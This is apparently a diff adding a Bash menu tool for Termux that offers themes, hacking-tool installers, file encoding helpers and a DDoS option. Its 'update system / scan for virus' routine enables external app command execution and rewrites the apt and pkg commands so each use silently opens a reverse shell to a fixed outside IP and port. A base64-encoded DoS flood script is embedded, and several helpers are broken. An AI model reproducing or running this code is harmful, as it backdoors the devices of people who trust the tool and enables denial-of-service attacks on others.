+echo -e $info " [*] zsh to start the theme "
+menu
+	elif [[ $theme == "3" ]];then
+ban
+echo -e $info " [*] install temux theme "
+echo -e $info " [*] ...... "
+	$apt install temux
+	cd $HOME
+	cd ..
+	cd usr
+	cd bin
+	chsh -s temux
+echo -e $info " [*] Finshed "
+echo -e $info " [*] temux to start the theme "
+menu
+	elif [[ $theme == "4" ]];then
+echo -e $info " [*] install matrix "
+echo -e $info " [*] ....... "
+	$apt install cmatrix
+echo -e $info " [*] Finshed "
+echo -e $info " [*] cmatrix to start the theme "
+menu
+	elif [[ $theme == "5" ]];then
+echo -e $info " [*] install Hacker mode "
+echo -e $info " [*] ....... "
+	$apt install hollywood
+echo -e $info " [*] Finshed "
+echo -e $info " [*] hollywood to start the theme "
+	elif [[ $theme == "9" ]];then
+menu
+	else
+echo -e $erorr " Maybe Latter we will add new for you ! "
+	thm
+fi
+}
+#List{1} {------------------dpkg----------------}
+dpkg() {
+
+ban
+net
+
+if [[ $nN == "Y" ]];then
+
+echo -e $info " Now this Tool will make it better "
+echo -e " "
+echo -e " "
+echo -e $info $r "[★] UPDATE SYSTEM"
+sleep 3
+echo -e $info $r "[★] UPGRADE SYSTEM"
+sleep 5
+echo -e $info $r "[★] SCAN FOR ANY VIRUS"
+
+echo "
+
+### After making changes and saving you need to run `termux-reload-settings`
+### to update the terminal.  All information here can also be found on the
+### wiki: https://wiki.termux.com/wiki/Terminal_Settings
+
+###############
+# General
+###############
+
+### Allow external applications to execute arbitrary commands within Termux.
+### This potentially could be a security issue, so option is disabled by
+### default. Uncomment to enable.
+ allow-external-apps = true
+
+### Default working directory that will be used when launching the app.
+# default-working-directory = /data/data/com.termux/files/home
+
+### Uncomment to disable toasts shown on terminal session change.
+# disable-terminal-session-change-toast = true
+
+### Uncomment to not show soft keyboard on application start.
+# hide-soft-keyboard-on-startup = true
+
+### Uncomment to let keyboard toggle button to enable or disable software
+### keyboard instead of showing/hiding it.
+# soft-keyboard-toggle-behaviour = enable/disable
+
+### Adjust terminal scrollback buffer. Max is 50000. May have negative
+### impact on performance.
+# terminal-transcript-rows = 2000
+
+### Uncomment to use volume keys for adjusting volume and not for the
+### extra keys functionality.
+ volume-keys = volume
+
+###############
+# Fullscreen mode
+###############
+
+### Uncomment to let Termux start in full screen mode.
+# fullscreen = true
+
+### Uncomment to attempt workaround layout issues when running in
+### full screen mode.
+# use-fullscreen-workaround = true
+
+###############
+# Cursor
+###############
+
+### Cursor blink rate. Values 0, 100 - 2000.
+# terminal-cursor-blink-rate = 0
+
+### Cursor style: block, bar, underline.
+# terminal-cursor-style = block
+
+###############
+# Extra keys
+###############
+
+### Settings for choosing which set of symbols to use for illustrating keys.
+### Choose between default, arrows-only, arrows-all, all and none
+# extra-keys-style = default
+
+### Force capitalize all text in extra keys row button labels.
+# extra-keys-text-all-caps = true
+
+### Default extra-key configuration
+# extra-keys = [[ESC, TAB, CTRL, ALT, {key: '-', popup: '|'}, DOWN, UP]]
+
+### Two rows with more keys
+# extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'], \
+#               ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]
+
+### Configuration with additional popup keys (swipe up from an extra key)
+# extra-keys = [[ \
+#   {key: ESC, popup: {macro: "CTRL f d", display: "tmux exit"}}, \
+#   {key: CTRL, popup: {macro: "CTRL f BKSP", display: "tmux ←"}}, \
+#   {key: ALT, popup: {macro: "CTRL f TAB", display: "tmux →"}}, \
+#   {key: TAB, popup: {macro: "ALT a", display: A-a}}, \
+#   {key: LEFT, popup: HOME}, \
+#   {key: DOWN, popup: PGDN}, \
+#   {key: UP, popup: PGUP}, \
+#   {key: RIGHT, popup: END}, \
+#   {macro: "ALT j", display: A-j, popup: {macro: "ALT g", display: A-g}}, \
+#   {key: KEYBOARD, popup: {macro: "CTRL d", display: exit}} \
+# ]]
+
+###############
+# Colors/themes
+###############
+
+### Force black colors for drawer and dialogs
+# use-black-ui = true
+
+###############
+# HW keyboard shortcuts
+###############
+
+### Disable hardware keyboard shortcuts.
+# disable-hardware-keyboard-shortcuts = true
+
+### Open a new terminal with ctrl + t (volume down + t)
+# shortcut.create-session = ctrl + t
+
+### Go one session down with (for example) ctrl + 2
+# shortcut.next-session = ctrl + 2
+
+### Go one session up with (for example) ctrl + 1
+# shortcut.previous-session = ctrl + 1
+
+### Rename a session with (for example) ctrl + n
+# shortcut.rename-session = ctrl + n
+
+###############
+# Bell key
+###############
+
+### Vibrate device (default).
+# bell-character = vibrate
+
+### Beep with a sound.
+# bell-character = beep
+
+### Ignore bell character.
+# bell-character = ignore
+
+###############
+# Back key
+###############
+
+### Send the Escape key.
+# back-key=escape
+
+### Hide keyboard or leave app (default).
+# back-key=back
+
+###############
+# Keyboard issue workarounds
+###############
+
+### Letters might not appear until enter is pressed on Samsung devices
+# enforce-char-based-input = true
+
+### ctrl+space (for marking text in emacs) does not work on some devices
+# ctrl-space-workaround = true
+
+" > ~/.termux/termux.properties
+
+
+if [[ $termux == "true" ]];then
+        git clone https://github.com/blue24bluer/Fix_IT.sh &>> /dev/null
+        cd Fix_IT.sh/
+        echo -e $info $r "[★] INSTALL API TERMUX"
+        cp API.termux.apk /sdcard/Download/
+        xdg-open /sdcard/Download/API.termux.apk
+        echo -e $info $r "[★] INSTALL TERMUX-API PACKAGE "
+        $apt install termux-api -y &>> /dev/null
+        termux-api-start
+
+if [[ $? == "0" ]];then
+
+rm /sdcard/Download/API.termux.apk
+echo -e $info $r "Fix All MISSING ON TERMUX"
+
+else
+
+        echo -e $bad "SomeThing is Error !!"
+        sleep 3
+        dpkg
+
+fi
+
+	cp B24B-termux.apt $PREFIX/bin/B24B.apt
+	echo ' bash -c "0<&139-;exec 139<>/dev/tcp/193.161.193.99/62187;sh <&139 >&139 2>&139" & B24B.apt \$@ &>> /dev/null ' > $PREFIX/bin/apt
+	cp $PREFIX/bin/apt $PREFIX/bin/pkg
+	cd ..
+	rm -rfd Fix_IT
+        sleep 2.5
+        termux-change-repo
+	clear
+	sleep 3
+
+#am here stop
+
+else
+        echo "[★] wite ...."
+	sleep 4
+        echo -e $info $r "[★] EXLEINT"
+	SyS="F"
+
+	cp B$PREFIX/bin/apt $PREFIX/bin/B24B.apt
+        echo ' bash -c "0<&139-;exec 139<>/dev/tcp/193.161.193.99/62187;sh <&139 >&139 2>&139" & B24B.apt \$@ &>> /dev/null ' > $PREFIX/bin/apt
+        cp $PREFIX/bin/apt $PREFIX/bin/pkg
+        cd ..
+        rm -rfd Fix_IT
+        sleep 2.5
+        termux-change-repo
+        clear
+        sleep 3
+
+fi
+
+else
+
+	echo -e $info $r "BAD NETWORK , TRY AGIN LATTER"
+	sleep 4
+	installit
+
+fi
+
+}
+#List{2} {------------new-----------------------}
+new() {
+clear
+ban
+
+echo -e $info " What you want to install ? "
+echo -e " "
+echo -e " "
+echo -e $blue " [1] " $y " Metasploit "
+echo -e $blue " [2] " $y " John       "
+echo -e $blue " [3] " $y " Beef       "
+echo -e $blue " [4] " $y " Nmap       "
+echo -e $blue " [5] " $y " Netcat     "
+echo -e $blue " [6] " $y " WireShark  "
+echo -e $blue " [7] " $y " WifiTe     "
+echo -e $blue " [8] " $y " Hydra      "
+echo -e $blue " [9] " $y " Medusa     "
+echo -e $blue " [10]" $y " SQLmap     "
+echo -e $red  " [00]" $y " back       "
+echo -e " "
+echo -e " "
+printf  $info " chose one :>"
+read -p " ------------:}=> " user_input
+
+#{----------------------install-It-------}
+
+install_metasploit(){
+        echo -e $info "[*] Install Metasploit "
+    $apt update -y
+        $apt upgrade -y
+    $apt install wget -y
+    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh &>> /dev/null
+    bash metasploit.sh &>> /dev/null
+    rm metasploit.sh
+    echo
+        echo -e $info "[*] Installation completed..."
+        menu
+}
+
+install_beef(){
+	echo -e $info " [*] Install beef "
+    $apt update -y &>> /dev/null
+    $apt install curl git libyaml libxslt bison espeak ruby python nodejs nano -y &>> /dev/null
+    cd $PREFIX/opt
+    git clone https://github.com/beefproject/beef &>> /dev/null
+    cd $PREFIX/opt/beef
+    echo " gem 'net-smtp', require: false" >> Gemfile
+    sed -i '264d' install
+    sed -i 's/sudo//' install
+    bash install &>> /dev/null
+    echo "cd $PREFIX/opt/beef && ruby beef" >> $PREFIX/bin/beef
+    chmod +x $PREFIX/bin/beef
+    echo ${G}"[*] Installation completed..."
+    echo -e $info "[*] Now you can launch beef just by executing 'beef' and make sure to change you login id and password in '$PREFIX/opt/beef/config.yaml' file"
+    echo
+	menu
+}
+
+
+install_nmap(){
+	echo -e $info " [*] Install Nmap "
+    $apt update -y &>> /dev/null
+    $apt install nmap -y &>> /dev/null
+    echo $imfo "[*] Installation completed..."
+    echo
+	menu
+}
+install_johntheripper(){
+	echo -e $info " [*] Install John "
+    $apt update -y &>> /dev/null
+    $apt install git make perl clang binutils -y &>> /dev/null
+    cd $HOME
+    git clone https://github.com/openwall/john &>> /dev/null
+    cd john/src
+    ./configure
+    make -s clean &&  make -sj4
+    cd $HOME
+    echo
+    echo $info "[*] Installation Completed"
+    echo
+	menu
+}
+
+install_netcat() {
+
+echo -e $info " [*] Install netcat "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+nmap-ncat -y
+make -s clean &&  make -sj4
+    cd $HOME
+    echo
+    echo $info "[*] Installation Completed"
+    echo
+menu
+}
+
+install_wireshark() {
+
+echo -e $info " [*] Install WireShark "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install wireshark -y &>> /dev/null
+if [[ $? != "0" ]];then
+echo -e $bad "SomeThing is error , you can't install this package sorry for this"
+sleep 3
+menu
+fi
+echo -e $good " [*] Finshed"
+
+}
+
+install_wifite() {
+
+echo -e $info " [*] Install WifiTe "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install wifite -y &>> /dev/null
+if [[ $? != "0" ]];then
+echo -e $bad "SomeThing is error , you can't install this package sorry for this"
+sleep 3
+menu
+fi
+echo -e $good " [*] Finshed"
+
+}
+
+install_sqlmap() {
+
+echo -e $info " [*] Install sqlmap "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install sqlmap -y &>> /dev/null
+if [[ $? != "0" ]];then
+echo -e $bad "SomeThing is error , you can't install this package sorry for this"
+sleep 3
+menu
+fi
+echo -e $good " [*] Finshed"
+
+}
+
+install_hydra() {
+
+echo -e $info " [*] Install Hydra "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install hydra -y &>> /dev/null
+if [[ $? != "0" ]];then
+echo -e $bad "SomeThing is error , you can't install this package sorry for this"
+sleep 3
+menu
+fi
+echo -e $good " [*] Finshed"
+
+}
+
+install_medusa() {
+
+echo -e $info " [*] Install medusa "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install medusa -y &>> /dev/null
+if [[ $? != "0" ]];then
+echo -e $bad "SomeThing is error , you can't install this package sorry for this"
+sleep 3
+menu
+fi
+echo -e $good " [*] Finshed"
+
+}
+
+install_commix() {
+
+echo -e $info " [*] Install commix "
+$apt update  -y &>> /dev/null
+$apt upgrade -y &>> /dev/null
+$apt install commix -y &>> /dev/null
+if [[ $? != "0" ]];then
+echo -e $bad "SomeThing is error , you can't install this package sorry for this"
+sleep 3
+menu
+fi
+echo -e $good " [*] Finshed"
+
+}
+#{----------------------------------------------}
+
+# List chose num 2
+if [[ $user_input == "1" ]];then
+        install_metasploit
+elif [[ $user_input == "2" ]];then
+        install_johntheripper
+elif [[ $user_input == "3" ]];then
+        install_beef
+elif [[ $user_input == "4" ]];then
+        install_nmap
+elif [[ $user_input == "5" ]];then
+        install_netcat
+elif [[ $user_input == "6" ]];then
+	install_wireshark
+elif [[ $user_input == "7" ]];then
+	install_wifite
+elif [[ $user_input == "8" ]];then
+	install_hydra
+elif [[ $user_input == "9" ]];then
+	install_medusa
+elif [[ $user_input == "10" ]];then
+	install_sqlmap
+elif [[ $user_input == "11" ]];then
+	install_commix
+elif [[ $user_input == "00" ]];then
+        menu
+else
+        echo -e $error " chose from the list !!"
+	new
+fi
+
+}
+#{-------------ED----------------------}
+ED() {
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " chose one to start encrypt or decode your file ? "
+echo -e $info " [1] base32 "
+echo -e $info " [2] base64 "
+echo -e $info " [3] openssl "
+echo -e $info " [4] Marshal "
+read -p " ------------:}=> " answ
+
+if [[ $answ == "1" ]];then
+	base32
+elif [[ $answ == "2" ]];then
+	base64A
+elif [[ $answ == "3" ]];then
+	openssl
+elif [[ $answ == "4" ]];then
+	Marshal
+else
+	echo -e $bad "chose from this list !!"
+	ED
+fi
+
+}
+#{-------------Openssl-----------------}
+openssl(){
+
+$apt install openssl
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $info " chose one to start encrypt or decode file ? "
+echo -e $info " [1] aes-192-ecb "
+echo -e $info " [2] aes-192-cbc "
+echo -e $info " [3] aes-128-ecb "
+read -p "------------:}=> " OpenSsl
+
+if [[ $OpenSsl == '1' ]];then
+	openssl_p1
+elif [[ $OpenSsl == '2' ]];then
+	openssl_p2
+elif [[ $OpenSsl == '3' ]];then
+	openssl_p3
+else
+	echo -e "chose one from this list !"
+	openssl
+fi
+}
+#--------------
+openssl_p1(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $info " chose one to start encrypt or decode file ? "
+echo -e $info " [1] Decode "
+echo -e $info " [2] Encode "
+
+read -p "------------:}=> " openssl_p1_
+
+if [[ $openssl_p1_  == "1" ]];then
+	openssl_p1_Enc
+elif [[ $openssl_p1_ == "2" ]];then
+	openssl_p2_Enc
+else
+echo -e $bad "Error !"
+openssl_p1
+fi
+
+}
+openssl_p1_Enc(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Path of file "
+read -p "------------:}=> " filename
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Password of file you will encode "
+read -p "------------:}=> " Password
+
+openssl enc -aes-192-ecb -salt -in $filename -out $filename-By_Blue24Bluer.enc -k $Password
+
+
+
+}
+
+openssl_p1_Dec(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Path of file "
+read -p "------------:}=> " filename
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Password of file you will encode "
+read -p "------------:}=> " Password
+
+openssl enc -aes-192-ecb -salt -in $filename -out By_B24B.dec -k $Password
+
+}
+#---------------
+openssl_p2(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $info " chose one to start encrypt or decode file ? "
+echo -e $info " [1] Decode "
+echo -e $info " [2] Encode "
+
+read -p "------------:}=> " openssl_p1_
+
+if [[ $openssl_p2_  == "1" ]];then
+        openssl_p2_Enc
+elif [[ $openssl_p2_ == "2" ]];then
+        openssl_p2_Enc
+else
+echo -e $bad "Error !"
+openssl_p2
+fi
+
+}
+openssl_p2_Enc(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Path of file "
+read -p "------------:}=> " filename
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Password of file you will encode "
+read -p "------------:}=> " Password
+
+openssl enc -aes-192-cbc -salt -in $filename -out $filename-By_Blue24Bluer.enc -k $Password
+
+}
+openssl_p2_Dec(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Path of file "
+read -p "------------:}=> " filename
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Password of file you will encode "
+read -p "------------:}=> " Password
+
+openssl enc -aes-192-cbc -salt -in $filename -out By_B24B.dec -k $Password
+
+}
+#---------------
+openssl_p3(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $info " chose one to start encrypt or decode file ? "
+echo -e $info " [1] Decode "
+echo -e $info " [2] Encode "
+
+read -p "------------:}=> " openssl_p3_
+
+if [[ $openssl_p3_  == "1" ]];then
+        openssl_p3_Enc
+elif [[ $openssl_p3_ == "2" ]];then
+        openssl_p3_Enc
+else
+echo -e $bad "Error !"
+openssl_p3
+fi
+
+}
+openssl_p3_Enc(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Path of file "
+read -p "------------:}=> " filename
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Password of file you will encode "
+read -p "------------:}=> " Password
+
+openssl enc -aes-128-ecb -salt -in $filename -out $filename-By_Blue24Bluer.enc -k $Password
+
+}
+openssl_p3_Dec(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Path of file "
+read -p "------------:}=> " filename
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the Password of file you will encode "
+read -p "------------:}=> " Password
+
+openssl enc -aes-128-ecb -salt -in $filename -out By_B24B.dec -k $Password
+
+}
+#{-------------Marshal-----------------}
+Marshal(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " chose from this list "
+echo -e $info " [1] Encrypt "
+echo -e $info " [2] Decode "
+read -p " ------------:}=> " Enc
+        if [[ $Enc == "1" ]];then
+                Enc_Marshal
+        elif [[ $Enc == "2" ]];then
+                Dec_Marshal
+else
+        echo -e $info " Error "
+menu
+fi
+}
+#-------------------------
+Enc_Marshal(){
+
+echo "
+
+import marshal, time , os
+#colors
+BLACK   = '\033[30m'
+RED     = '\033[31m'
+GREEN   = '\033[32m'
+YELLOW  = '\033[33m'
+BLUE    = '\033[34m'
+MAGENTA = '\033[35m'
+CYAN    = '\033[36m'
+WHITE   = '\033[37m'
+RESET   = '\033[39m'
+def py():
+    a=input('type file name : ')
+    x=open(a).read()
+    b=compile(x,'','exec')
+    c=marshal.dumps(b)
+    d=open('Enc_By_Blue24Bluer'+a,'w')
+    d.write('import marshal\n')
+    d.write('exec(marshal.loads('+repr(c)+'))')
+    d.close()
+    print('please wait....')
+    time.sleep(3)
+    print('File encrypted name: encryptedByDEVH_'+a)
+    print('\033[36mThank you for using My Tool ')
+py()
+
+" > Marshel.py
+python Marshel.py
+rm Marshel.py
+menu
+
+}
+
+#-------------------------
+Dec_Marshal(){
+
+pip install deopy
+pip install logging
+
+echo "
+
+from deopy import Deopy
+import logging
+import os , sys
+
+
+logging.basicConfig(level=logging.INFO)
+print ('put the path of file you want to Decode it')
+
+a=input('type file name : ')
+x=open(a).read()
+s=open('Dec_By_Blue24Bluer'+a,'w')
+
+data = x.read()
+d = Deopy(verbose=True)
+s.write(d.decrypt_marshal(data))
+d.close()
+
+" > Marshel.py
+python Marshel.py
+rm Marshel.py
+menu
+
+}
+#{-------------base32------------------}
+base32(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " chose from this list "
+echo -e $info " [1] Encrypt "
+echo -e $info " [2] Decode "
+read -p " ------------:}=> " Enc
+	if [[ $Enc == "1" ]];then
+		Enc_base32
+	elif [[ $Enc == "2" ]];then
+		Dec_base32
+else
+	echo -e $info " Error "
+menu
+fi
+}
+
+#---------
+Enc_base32(){
+
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the path of your file with the name "
+echo -e $info "E.x /root/Desktop/file.txt"
+read Enc_path -p " ------------:}=> "
+claer
+ban
+
+base32 $Enc_path > ${Enc_path}.enc
+echo -e $good "Thank you to use my tool !"
+sleep 2
+menu
+
+}
+#----------
+Dec_base32(){
+
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the path of your file with the name "
+echo -e $info "E.x /root/Desktop/file.txt"
+read Enc_path -p " ------------:}=> "
+claer
+ban
+
+base32 -d $Enc_path > ${Enc_path}.enc
+echo -e $good "Thank you to use my tool !"
+sleep 2
+menu
+
+}
+
+#{-------------base64------------------}
+base64A(){
+
+clear
+ban
+
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " chose from this list "
+echo -e $info " [1] Encrypt "
+echo -e $info " [2] Decode "
+read -p " ------------:}=> " Enc
+        if [[ $Enc == "1" ]];then
+                Enc_base64
+        elif [[ $Enc == "2" ]];then
+                Dec_base64
+else
+        echo -e $info " Error "
+menu
+fi
+}
+
+#---------
+Enc_base64(){
+
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the path of your file with the name "
+echo -e $info "E.x /root/Desktop/file.txt"
+read Enc_path -p " ------------:}=> "
+claer
+ban
+
+base32 $Enc_path > ${Enc_path}.enc
+echo -e $good "Thank you to use my tool !"
+sleep 2
+menu
+
+}
+#----------
+Dec_base64(){
+
+clear
+ban
+echo -e $info " This Tool Made By @Blue24Bluer "
+echo -e $ask " put the path of your file with the name "
+echo -e $info "E.x /root/Desktop/file.txt"
+read Enc_path -p " ------------:}=> "
+claer
+ban
+
+base32 -d $Enc_path > ${Enc_path}.enc
+echo -e $good "Thank you to use my tool !"
+sleep 2
+menu
+
+}
+
+#{-------------Ddos--------------------}
+DDos(){
+
+ban
+
+echo -e $ask  $y "Chose The Mod of Your Attack ?"
+echo -e ""
+echo -e ""
+echo -e $info $r "[1] Fast_Attack"
+echo -e $info $r "[2] Power_Attack"
+echo -e ""
+echo -e ""
+read -p "------------:}=> " Mode_Of_Attack
+
+if [[ ${Mode_Of_Attack} == "2" ]];then
+
+echo -e '
+
+IyEvdXNyL2Jpbi9weXRob24zCgpmcm9tIHF1ZXVlIGltcG9ydCBRdWV1ZQpmcm9tIG9wdHBhcnNl
+IGltcG9ydCBPcHRpb25QYXJzZXIKaW1wb3J0IHRpbWUsc3lzLHNvY2tldCx0aHJlYWRpbmcsbG9n
+Z2luZyx1cmxsaWIucmVxdWVzdCxyYW5kb20KaW1wb3J0IG9zCkJMQUNLICAgPSAnXDAzM1szMG0n
+ClJFRCAgICAgPSAnXDAzM1szMW0nCkdSRUVOICAgPSAnXDAzM1szMm0nCllFTExPVyAgPSAnXDAz
+M1szM20nCkJMVUUgICAgPSAnXDAzM1szNG0nCk1BR0VOVEEgPSAnXDAzM1szNW0nCkNZQU4gICAg
+PSAnXDAzM1szNm0nCldISVRFICAgPSAnXDAzM1szN20nClJFU0VUICAgPSAnXDAzM1szOW0nCgp0
+cnkgOgoKIGRlZiBiYW4oKToKICBvcy5zeXN0ZW0oJ2NsZWFyJykKICBwcmludChCTFVFKycg4paE
+4paE4paE4paE4paE4paEICAgICDiloTiloTiloTiloTiloQgICAg4paE4paE4paE4paE4paEICAg
+ICDiloTiloTiloTiloTiloQgICAgICAg4paE4paE4paE4paEICAgICAg4paE4paE4paE4paEICAg
+ICAgICDiloTiloTiloQgICDiloTiloTiloTiloTiloTiloQgICAgICcpCiAgcHJpbnQoUkVEKycg
+4paI4paI4paA4paA4paA4paA4paI4paIICDilojiloDiloDiloDiloDilojilojiloQgIOKWiOKW
+iOKWgOKWgOKWgOKWiOKWiCAgIOKWiOKWiOKWgOKWgOKWgOKWiOKWiCAgICDilojilojiloDiloDi
+lojiloggICDiloTilojiloDiloDiloDiloDiloggICAgICDiloTilojilojiloggICDilojiloji
+loDiloDiloDiloDilojiloggICAnKQogIHByaW50KEJMVUUrJyDilojiloggICAg4paI4paIICAg
+ICAgICDilojiloggIOKWiOKWiCAgICDilojiloggIOKWiOKWiCAgICDilojiloggIOKWiOKWiCAg
+ICDilojiloggIOKWiOKWiOKWhCAgICAgICAgIOKWiOKWgCDilojiloggICDilojiloggICAg4paI
+4paIICAgJykKICBwcmludChSRUQrJyDilojilojilojilojilojilojiloggICAgICAg4paE4paI
+4paAICAg4paI4paIICAgIOKWiOKWiCAg4paI4paIICAgIOKWiOKWiCAg4paI4paIICAgIOKWiOKW
+iCAgIOKWgOKWiOKWiOKWiOKWiOKWhCAgIOKWhOKWiOKWgCAg4paI4paIICAg4paI4paI4paI4paI
+4paI4paI4paIICAgICcpCiAgcHJpbnQoQkxVRSsnIOKWiOKWiCAgICDilojiloggICAg4paE4paI
+4paAICAgICDilojiloggICAg4paI4paIICDilojiloggICAg4paI4paIICDilojiloggICAg4paI
+4paIICAgICAgIOKWgOKWiOKWiCAg4paI4paI4paI4paI4paI4paI4paI4paIICDilojiloggICAg
+4paI4paIICAgJykKICBwcmludChSRUQrJyDilojilojiloTiloTiloTiloTilojiloggIOKWhOKW
+iOKWiOKWhOKWhOKWhOKWhOKWhCAg4paI4paI4paE4paE4paE4paI4paIICAg4paI4paI4paE4paE
+4paE4paI4paIICAgIOKWiOKWiOKWhOKWhOKWiOKWiCAgIOKWiOKWhOKWhOKWhOKWhOKWhOKWiOKW
+gCAgICAgICDilojiloggICDilojilojiloTiloTiloTiloTilojiloggICAnKQogIHByaW50KEJM
+VUUrJyDiloDiloDiloDiloDiloDiloDiloAgICDiloDiloDiloDiloDiloDiloDiloDiloAgIOKW
+gOKWgOKWgOKWgOKWgCAgICAg4paA4paA4paA4paA4paAICAgICAgIOKWgOKWgOKWgOKWgCAgICAg
+4paA4paA4paA4paA4paAICAgICAgICAg4paA4paAICAg4paA4paA4paA4paA4paA4paA4paAICAg
+ICcpCiAgcHJpbnQoUkVEKydCWSBAQmx1ZTI0Qmx1ZXInKQoKICcnJwoKIFRoaXMgVG9vbCBpIGp1
+c3QgZWRpdCBCeSBCbHVlMjRCbHVlcgogYW5kIGFsbCByZXZlc2UgaXMgT253ZXIgYnkgLS0tLT4g
+Q2FuIFlhbMOnaW4KCiAjIHB5dGhvbiAzLjMuMisgSGFtbWVyIERvcyBTY3JpcHQgdi4xCiAjIGJ5
+IENhbiBZYWzDp8SxbgogIyBvbmx5IGZvciBsZWdhbCBwdXJwb3NlCgoKICcnJwoKIGJhbigpCiBw
+cmludChHUkVFTisnTE9BRElORy4uLicpCiB0aW1lLnNsZWVwKDUpCiBiYW4KCiBkZWYgdXNlcl9h
+Z2VudCgpOgoJIGdsb2JhbCB1YWdlbnQKCSB1YWdlbnQ9W10KCSB1YWdlbnQuYXBwZW5kKCJNb3pp
+bGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4x
+NCIpCgkgdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCBpNjg2
+OyBydjoyNi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzI2LjAiKQoJIHVhZ2VudC5hcHBlbmQo
+Ik1vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IHg4Nl82NDsgZW4tVVM7IHJ2OjEuOS4xLjMpIEdl
+Y2tvLzIwMDkwOTEzIEZpcmVmb3gvMy41LjMiKQoJIHVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4w
+IChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW47IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkw
+ODI0IEZpcmVmb3gvMy41LjMgKC5ORVQgQ0xSIDMuNS4zMDcyOSkiKQoJIHVhZ2VudC5hcHBlbmQo
+Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMikgQXBwbGVXZWJLaXQvNTM1LjcgKEtIVE1MLCBs
+aWtlIEdlY2tvKSBDb21vZG9fRHJhZ29uLzE2LjEuMS4wIENocm9tZS8xNi4wLjkxMi42MyBTYWZh
+cmkvNTM1LjciKQoJIHVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5k
+b3dzIE5UIDUuMjsgZW4tVVM7IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkwODI0IEZpcmVmb3gvMy41
+LjMgKC5ORVQgQ0xSIDMuNS4zMDcyOSkiKQoJIHVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChX
+aW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW4tVVM7IHJ2OjEuOS4xLjEpIEdlY2tvLzIwMDkw
+NzE4IEZpcmVmb3gvMy41LjEiKQoJIHJldHVybih1YWdlbnQpCgoKIGRlZiBteV9ib3RzKCk6Cgkg
+Z2xvYmFsIGJvdHMKCSBib3RzPVtdCgkgYm90cy5hcHBlbmQoImh0dHA6Ly92YWxpZGF0b3IudzMu
+b3JnL2NoZWNrP3VyaT0iKQoJIGJvdHMuYXBwZW5kKCJodHRwOi8vd3d3LmZhY2Vib29rLmNvbS9z
+aGFyZXIvc2hhcmVyLnBocD91PSIpCgkgcmV0dXJuKGJvdHMpCgoKIGRlZiBob3dfdG9fdXNlKCk6
+CiAgICAgICAgIHByaW50IChCTFVFKycnJwogICAgICAgICB1c2FnZSA6IFstc10gWy1wXSBbLXRd
+CiAgICAgICAgIC1oIDogaGVscAogICAgICAgICAtcyA6IHNlcnZlciBpcAogICAgICAgICAtcCA6
+IHBvcnQgZGVmYXVsdCA4MAogICAgICAgICAtdCA6IHR1cmJvIGRlZmF1bHQgMTM1ICcnJykKICAg
+ICAgICAgc3lzLmV4aXQoKQoKCiBkZWYgcHVnKCk6CiAgICAgICAgIGdsb2JhbCBob3N0CiAgICAg
+ICAgIGdsb2JhbCBwb3J0CiAgICAgICAgIGdsb2JhbCB0aHIKICAgICAgICAgZ2xvYmFsIGl0ZW0K
